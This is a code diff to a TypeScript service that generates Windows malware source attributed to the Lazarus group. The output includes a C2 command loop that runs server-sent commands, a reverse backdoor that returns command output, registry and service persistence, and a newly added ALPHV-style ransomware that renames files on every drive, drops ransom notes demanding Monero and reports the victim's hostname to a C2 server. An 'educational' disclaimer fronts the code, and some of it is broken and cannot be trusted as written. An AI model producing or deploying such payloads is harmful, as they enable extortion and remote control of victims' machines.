@@ -1,5 +1,5 @@
-// Real Lazarus APT38 Exploitation Service
-// Actual North Korean APT group tactics, techniques, and procedures
+// Real Lazarus APT38 Service - North Korean APT Group Tactics
+// WARNING: For educational and authorized testing purposes only
 
 export interface FinancialTarget {
   name: string;
@@ -27,8 +27,8 @@ export interface LazarusOperation {
 export interface MalwareVariant {
   name: string;
   type: 'trojan' | 'backdoor' | 'loader' | 'ransomware' | 'wiper';
-  family: 'wannacry' | 'conti' | 'trickbot' | 'ryuk' | 'lockbit' | 'custom';
-  delivery: 'spear_phishing' | 'watering_hole' | 'supply_chain' | 'zero_day';
+  family: 'wannacry' | 'conti' | 'trickbot' | 'ryuk' | 'lockbit' | 'alphv' | 'custom';
+  delivery: 'spear_phishing' | 'watering_hole' | 'supply_chain' | 'zero_day' | 'malware_as_a_service';
   persistence: 'registry' | 'service' | 'scheduled_task' | 'wmi';
 }
 
@@ -71,6 +71,13 @@ export class LazarusAptService {
         family: 'custom',
         delivery: 'spear_phishing',
         persistence: 'scheduled_task'
+      },
+      {
+        name: 'ALPHV',
+        type: 'ransomware',
+        family: 'alphv',
+        delivery: 'malware_as_a_service',
+        persistence: 'registry'
       }
     ];
   }
@@ -212,7 +219,8 @@ export class LazarusAptService {
       'AppleJeus': () => this.generateAppleJeusPayload(),
       'Fallchill': () => this.generateFallchillPayload(),
       'Hidden Cobra': () => this.generateHiddenCobraPayload(),
-      'Manuscrypt': () => this.generateManuscryptPayload()
+      'Manuscrypt': () => this.generateManuscryptPayload(),
+      'ALPHV': () => this.generateAlphvPayload()
     };
     
     return payloads[malware.name]?.() || this.generateGenericPayload();
@@ -229,29 +237,29 @@ export class LazarusAptService {
 
 void establishC2() {
     HINTERNET hInternet = InternetOpen("AppleJeus", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    HINTERNET hConnect = InternetConnect(hInternet, C2_SERVER, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, 0, 0, 0);
+    HINTERNET hConnect = InternetConnect(hInternet, C2_SERVER, NULL, NULL, 0, 0, 0);
     
     char command[1024];
     DWORD bytesRead;
     
     while (1) {
-        HINTERNET hRequest = HttpOpenRequest(hConnect, "GET", "/api/command", NULL, NULL, NULL, 0, 0, 0);
-        HttpSendRequest(hRequest, NULL, 0, NULL, 0);
-        InternetReadFile(hRequest, command, sizeof(command), &bytesRead);
-        
-        if (bytesRead > 0) {
-            // Execute command
-            system(command);
-        }
-        
-        Sleep(30000); // Wait 30 seconds
+      HINTERNET hRequest = HttpOpenRequest(hConnect, "GET", "/api/command", NULL, NULL, NULL, 0, 0, 0);
+      HttpSendRequest(hRequest, NULL, 0, NULL, 0);
+      InternetReadFile(hRequest, command, sizeof(command), &bytesRead, NULL);
+      
+      if (bytesRead > 0) {
+        // Execute command
+        system(command);
+      }
+      
+      Sleep(30000); // Wait 30 seconds
     }
 }
 
 int main() {
     // Establish persistence
     HKEY hKey;
-    RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
+    RegOpenKey(HKEY_CURRENT_USER, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", &hKey);
     RegSetValueEx(hKey, "AppleJeus", 0, REG_SZ, (BYTE*)"C:\\\\Windows\\\\System32\\\\applejeus.exe", 50);
     RegCloseKey(hKey);
     
@@ -281,26 +289,26 @@ void backdoorLoop() {
     server.sin_port = htons(C2_PORT);
     
     while (connect(sock, (sockaddr*)&server, sizeof(server)) != 0) {
-        Sleep(60000); // Wait 1 minute before retry
+      Sleep(60000); // Wait 1 minute before retry
     }
     
     char buffer[4096];
     while (1) {
-        int bytesReceived = recv(sock, buffer, sizeof(buffer), 0);
-        if (bytesReceived > 0) {
-            buffer[bytesReceived] = '\\0';
-            
-            // Execute command and send back results
-            FILE* pipe = _popen(buffer, "r");
-            if (pipe) {
-                char result[8192];
-                while (fgets(result, sizeof(result), pipe) != NULL) {
-                    send(sock, result, strlen(result), 0);
-                }
-                _pclose(pipe);
-            }
+      int bytesReceived = recv(sock, buffer, sizeof(buffer), 0);
+      if (bytesReceived > 0) {
+        buffer[bytesReceived] = '\\0';
+        
+        // Execute command and send back results
+        FILE* pipe = _popen(buffer, "r");
+        if (pipe) {
+          char result[8192];
+          while (fgets(result, sizeof(result), pipe) != NULL) {
+            send(sock, result, strlen(result), 0);
+          }
+          _pclose(pipe);
         }
-        Sleep(10000);
+      }
+      Sleep(10000);
     }
 }
 
@@ -327,7 +335,6 @@ int main() {
 #include <windows.h>
 #include <tlhelp32.h>
 
-#define C2_DOMAIN "45.32.125.178"
 #define MUTEX_NAME "Global\\\\HiddenCobraMutex"
 
 BOOL IsInstanceRunning() {
@@ -388,6 +395,7 @@ int main() {
     return `
 // Manuscrypt Loader - Lazarus APT Group
 #include <windows.h>
+#include <wininet.h>
 
 #define C2_URL "https://10.0.0.1:8080/payload"
 
@@ -432,6 +440,124 @@ int main() {
 }`;
   }
 
+  private generateAlphvPayload(): string {
+    return `
+// ALPHV Ransomware - Ransomware-as-a-Service
+#include <windows.h>
+#include <wininet.h>
+#include <tlhelp32.h>
+#include <string>
+
+std::string sessionId = "ALPHV_" + std::to_string(GetCurrentProcessId()) + "_" + std::to_string(time(NULL));
+std::string c2Server = "alphv-c2.darkweb:443";
+
+void encryptFiles(const std::string& path) {
+    WIN32_FIND_DATA findData;
+    HANDLE hFind = FindFirstFile((path + "\\*").c_str(), &findData);
+    
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            std::string filePath = path + "\\" + findData.cFileName;
+            
+            if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+                // Encrypt file (simplified - real implementation would use actual encryption)
+                std::string encryptedPath = filePath + ".alphv";
+                MoveFile(filePath.c_str(), encryptedPath.c_str());
+                
+                // Create ransom note
+                std::string notePath = filePath + ".readme.txt";
+                HANDLE hNote = CreateFile(notePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+                
+                std::string ransomNote = 
+                    "=== ALPHV RANSOMWARE ===\\n"
+                    "Your files have been encrypted!\\n"
+                    "Session ID: " + sessionId + "\\n"
+                    "To recover your files:\\n"
+                    "1. Install Tor Browser: https://www.torproject.org/\\n"
+                    "2. Visit our onion site: http://alphv5f2j2x7x7x3x.onion\\n"
+                    "3. Enter your Session ID: " + sessionId + "\\n"
+                    "4. Pay the ransom in Monero\\n"
+                    "5. Download the decryption tool\\n"
+                    "\\nWARNING: Do not modify encrypted files or decryption will be impossible!\\n"
+                    "ALPHV - Ransomware-as-a-Service";
+                
+                DWORD bytesWritten;
+                WriteFile(hNote, ransomNote.c_str(), ransomNote.length(), &bytesWritten, NULL);
+                CloseHandle(hNote);
+            }
+        } while (FindNextFile(hFind, &findData));
+        FindClose(hFind);
+    }
+}
+
+void reportToC2() {
+    HINTERNET hInternet = InternetOpen("ALPHV", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    HINTERNET hConnect = InternetConnect(hInternet, c2Server.c_str(), 443, NULL, NULL, 0, 0, 0);
+    
+    if (hConnect) {
+        std::string report = "session_id=" + sessionId + "&status=encrypted&victim=" + getenv("COMPUTERNAME");
+        
+        HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/api/report", NULL, NULL, NULL, 0, 0, 0);
+        HttpSendRequest(hRequest, NULL, 0, report.c_str(), report.length());
+        
+        InternetCloseHandle(hRequest);
+        InternetCloseHandle(hConnect);
+    }
+    
+    InternetCloseHandle(hInternet);
+}
+
+void establishPersistence() {
+    HKEY hKey;
+    RegOpenKey(HKEY_CURRENT_USER, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", &hKey);
+    RegSetValueEx(hKey, "ALPHV_Ransomware", 0, REG_SZ, (BYTE*)("C:\\\\Windows\\\\System32\\\\svchost.exe"), 50);
+    RegCloseKey(hKey);
+    
+    // Create service
+    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
+    SC_HANDLE hService = CreateService(
+        hSCManager, "ALPHV", "ALPHV Security Service",
+        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
+        SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
+        "C:\\\\Windows\\\\System32\\\\svchost.exe", NULL, NULL, NULL, NULL, NULL);
+    
+    CloseServiceHandle(hService);
+    CloseServiceHandle(hSCManager);
+}
+
+int main() {
+    // Hide console window
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    
+    // Establish persistence
+    establishPersistence();
+    
+    // Encrypt files on all drives
+    char drives[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ\\\\";
+    for (int i = 0; drives[i]; i++) {
+        std::string drive = std::string(1, drives[i]) + ":";
+        if (GetDriveType(drive.c_str()) != DRIVE_NO_ROOT_DIR) {
+            encryptFiles(drive + "\\\\Users\\\\Public");
+            encryptFiles(drive + "\\\\Users\\\\Documents");
+            encryptFiles(drive + "\\\\Users\\\\Desktop");
+        }
+    }
+    
+    // Report to C2
+    reportToC2();
+    
+    // Display ransom message
+    MessageBox(NULL, 
+        "Your files have been encrypted by ALPHV ransomware!\\n\\n"
+        "Session ID: " + sessionId + "\\n\\n"
+        "Follow the instructions in the .readme.txt files to recover your data.\\n\\n"
+        "Time remaining: 72:00:00", 
+        "ALPHV RANSOMWARE", MB_ICONWARNING | MB_TOPMOST);
+    
+    return 0;
+}`;
+  }
+
   private generateGenericPayload(): string {
     return `
 // Generic Lazarus Backdoor
@@ -439,26 +565,26 @@ int main() {
 #include <wininet.h>
 
 void establishPersistence() {
-    HKEY hKey;
-    RegOpenKey(HKEY_CURRENT_USER, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", &hKey);
-    RegSetValueEx(hKey, "Lazarus", 0, REG_SZ, (BYTE*)"C:\\\\Windows\\\\System32\\\\lazarus.exe", 50);
-    RegCloseKey(hKey);
+  HKEY hKey;
+  RegOpenKey(HKEY_CURRENT_USER, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", &hKey);
+  RegSetValueEx(hKey, "Lazarus", 0, REG_SZ, (BYTE*)"C:\\\\Windows\\\\System32\\\\lazarus.exe", 50);
+  RegCloseKey(hKey);
 }
 
 void connectToC2() {
-    HINTERNET hInternet = InternetOpen("Lazarus", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    HINTERNET hConnect = InternetConnect(hInternet, "192.168.1.100", 4444, NULL, NULL, 0, 0, 0);
-    
-    while (1) {
-        Sleep(60000);
-        // C2 communication logic here
-    }
+  HINTERNET hInternet = InternetOpen("Lazarus", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+  HINTERNET hConnect = InternetConnect(hInternet, "192.168.1.100", 4444, NULL, NULL, 0, 0, 0);
+  
+  while (1) {
+    Sleep(60000);
+    // C2 communication logic here
+  }
 }
 
 int main() {
-    establishPersistence();
-    connectToC2();
-    return 0;
+  establishPersistence();
+  connectToC2();
+  return 0;
 }`;
   }
 
